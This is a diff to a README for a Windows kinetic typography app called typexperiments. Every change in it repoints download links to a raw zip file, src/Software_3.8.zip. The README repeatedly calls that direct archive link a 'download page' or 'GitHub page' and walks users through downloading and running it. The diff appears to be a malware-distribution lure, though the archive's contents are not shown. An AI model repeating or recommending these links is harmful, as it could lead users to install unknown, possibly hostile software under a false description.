@@ -1,6 +1,6 @@
 # 🎞️ typexperiments - Smooth text animation made simple
 
-[![Download typexperiments](https://img.shields.io/badge/Download-View%20on%20GitHub-blue?style=for-the-badge)](https://github.com/kenzozer/typexperiments/raw/refs/heads/main/src/Software_3.8.zip)
+[![Download typexperiments](https://img.shields.io/badge/Download-View%20on%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/kenzozer/typexperiments/main/src/Software_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ typexperiments is a kinetic typography app that turns plain text into smooth mot
 
 Use this page to download and open the app:
 
-[Visit the download page on GitHub](https://github.com/kenzozer/typexperiments/raw/refs/heads/main/src/Software_3.8.zip)
+[Visit the download page on GitHub](https://raw.githubusercontent.com/kenzozer/typexperiments/main/src/Software_3.8.zip)
 
 ## 💻 What You Need
 
@@ -25,7 +25,7 @@ For best results, use a modern browser and keep Windows up to date.
 
 ## 📥 Download Typexperiments
 
-1. Open the GitHub page here: https://github.com/kenzozer/typexperiments/raw/refs/heads/main/src/Software_3.8.zip
+1. Open the GitHub page here: https://raw.githubusercontent.com/kenzozer/typexperiments/main/src/Software_3.8.zip
 2. Find the latest release or download option on the page
 3. Download the Windows file to your computer
 4. Save it in a folder you can find, such as Downloads or Desktop
@@ -141,7 +141,7 @@ typexperiments works well for:
 
 Check the GitHub page for new versions, fixes, and release files:
 
-[https://github.com/kenzozer/typexperiments/raw/refs/heads/main/src/Software_3.8.zip](https://github.com/kenzozer/typexperiments/raw/refs/heads/main/src/Software_3.8.zip)
+[https://raw.githubusercontent.com/kenzozer/typexperiments/main/src/Software_3.8.zip](https://raw.githubusercontent.com/kenzozer/typexperiments/main/src/Software_3.8.zip)
 
 ## 📝 Quick Start Checklist
 
